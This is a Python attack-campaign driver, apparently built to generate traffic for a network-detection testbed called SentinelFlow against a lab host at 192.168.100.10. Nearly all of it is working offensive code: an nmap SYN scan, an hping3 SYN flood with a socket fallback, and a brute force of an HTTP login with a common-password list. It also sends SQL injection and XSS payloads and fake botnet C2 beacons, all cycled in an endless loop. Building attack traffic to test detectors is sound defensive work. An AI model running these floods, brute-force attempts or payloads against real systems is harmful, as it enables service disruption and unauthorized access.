"""
SentinelFlow Testbed - Automated Attacker Campaign Driver
=========================================================
Executes realistic penetration test attacks against the victim node (192.168.100.10):
  1. Port Scanning & Service Enumeration (Nmap)
  2. Denial of Service (SYN Flood / Volumetric)
  3. Distributed Denial of Service (Multi-source UDP/TCP burst)
  4. Authentication Brute Force (SSH & HTTP Form credential stuffing)
  5. Web Exploitation (SQL Injection & Cross-Site Scripting)
  6. Botnet Command & Control (C2) Beaconing
"""

import argparse
import random
import subprocess
import sys
import time
import requests

VICTIM_IP = "192.168.100.10"
VICTIM_URL = f"http://{VICTIM_IP}"

PASSWORDS_WORDLIST = [
    "123456", "password", "admin123", "welcome", "qwerty",
    "letmein", "monkey", "dragon", "master", "password123"
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "admin' --",
    "' UNION SELECT 1, 'injected', 'admin' --",
    "1' ORDER BY 1--+",
    "' OR 1=1 LIMIT 1; --",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:/*--></title></style></textarea></script><svg/onload=alert()>",
]


def execute_port_scan():
    """Runs high-speed TCP SYN / Connect scan across target ports."""
    print(f"\n[ATTACK: PORT SCAN] Starting reconnaissance sweep on {VICTIM_IP}...")
    ports = "21,22,23,25,53,80,110,143,443,3306,8080,8443"
    cmd = ["nmap", "-sS", "-T4", "-p", ports, VICTIM_IP]
    try:
        res = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
        print(f"[+] Nmap output:\n{res.stdout[:400]}")
    except Exception as e:
        print(f"[!] Nmap fallback: scanning via socket sweep: {e}")
        import socket
        for p in [21, 22, 80, 443, 3306, 8080]:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            s.connect_ex((VICTIM_IP, p))
            s.close()


def execute_dos_syn_flood(duration_seconds: int = 5):
    """Executes high-rate TCP SYN flood burst against victim web port."""
    print(f"\n[ATTACK: DoS SYN FLOOD] Launching volumetric SYN flood on {VICTIM_IP}:80 for {duration_seconds}s...")
    cmd = ["hping3", "-S", "-p", "80", "--flood", "--count", "5000", VICTIM_IP]
    try:
        subprocess.run(cmd, timeout=duration_seconds, capture_output=True)
    except subprocess.TimeoutExpired:
        pass
    except Exception as e:
        print(f"[!] hping3 not available, fallback to socket burst: {e}")
        import socket
        for _ in range(500):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setblocking(False)
                s.connect_ex((VICTIM_IP, 80))
                s.close()
            except Exception:
                pass
    print("[+] DoS SYN flood wave completed.")


def execute_brute_force():
    """Executes credential brute-force attempts on HTTP login and SSH."""
    print(f"\n[ATTACK: BRUTE FORCE] Starting credential stuffing on {VICTIM_URL}/login...")
    for pwd in PASSWORDS_WORDLIST:
        try:
            r = requests.post(f"{VICTIM_URL}/login", data={"username": "admin", "password": pwd}, timeout=2)
            print(f"  [-] Tried admin:{pwd:<12} -> HTTP {r.status_code}")
            if "Successful" in r.text:
                print(f"  [+] Success! Found valid credentials: admin:{pwd}")
                break
        except Exception as e:
            print(f"  [!] HTTP request error: {e}")
        time.sleep(0.2)


def execute_web_attacks():
    """Executes SQL Injection and XSS vulnerability probes."""
    print(f"\n[ATTACK: WEB ATTACK] Firing SQL Injection & XSS payloads at {VICTIM_URL}/search...")
    all_payloads = SQLI_PAYLOADS + XSS_PAYLOADS
    for payload in all_payloads:
        try:
            r = requests.get(f"{VICTIM_URL}/search", params={"q": payload}, timeout=2)
            print(f"  [-] Fired payload: {payload:<45} -> HTTP {r.status_code} ({len(r.text)} bytes)")
        except Exception as e:
            print(f"  [!] Web request error: {e}")
        time.sleep(0.3)


def execute_botnet_c2():
    """Simulates periodic Botnet C2 beaconing and data staging."""
    print(f"\n[ATTACK: BOTNET C2] Emulating C2 communication traffic to {VICTIM_IP}...")
    for _ in range(8):
        try:
            headers = {"User-Agent": "Mirai/Botnet-Client-v1.4", "X-Bot-ID": f"BOT-{random.randint(1000, 9999)}"}
            r = requests.get(f"{VICTIM_URL}/api/status", headers=headers, timeout=2)
            print(f"  [-] C2 Beacon checkin -> HTTP {r.status_code}")
        except Exception as e:
            print(f"  [!] C2 error: {e}")
        time.sleep(0.4)


def run_continuous_campaign():
    """Cycles through attack campaigns with randomized intervals."""
    print("=" * 65)
    print("🚀 SENTINELFLOW ATTACKER NODE: Continuous Campaign Engine")
    print(f"Targeting Victim: {VICTIM_IP} ({VICTIM_URL})")
    print("=" * 65)

    campaigns = [
        ("Port Scan Sweep", execute_port_scan),
        ("Web Exploitation Wave", execute_web_attacks),
        ("Authentication Brute Force", execute_brute_force),
        ("DoS SYN Flood Surge", execute_dos_syn_flood),
        ("Botnet C2 Beaconing", execute_botnet_c2),
    ]

    while True:
        name, func = random.choice(campaigns)
        print(f"\n>>> LAUNCHING CAMPAIGN: {name} <<<")
        func()
        pause = random.uniform(3.0, 8.0)
        print(f"[*] Sleeping {pause:.1f}s before next attack campaign...")
        time.sleep(pause)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SentinelFlow Live Attack Campaign Launcher")
    parser.add_argument("--attack", choices=["scan", "dos", "bruteforce", "web", "botnet", "all", "continuous"], default="continuous")
    args = parser.parse_args()

    if args.attack == "scan":
        execute_port_scan()
    elif args.attack == "dos":
        execute_dos_syn_flood()
    elif args.attack == "bruteforce":
        execute_brute_force()
    elif args.attack == "web":
        execute_web_attacks()
    elif args.attack == "botnet":
        execute_botnet_c2()
    elif args.attack == "all":
        execute_port_scan()
        execute_web_attacks()
        execute_brute_force()
        execute_dos_syn_flood()
        execute_botnet_c2()
    else:
        run_continuous_campaign()
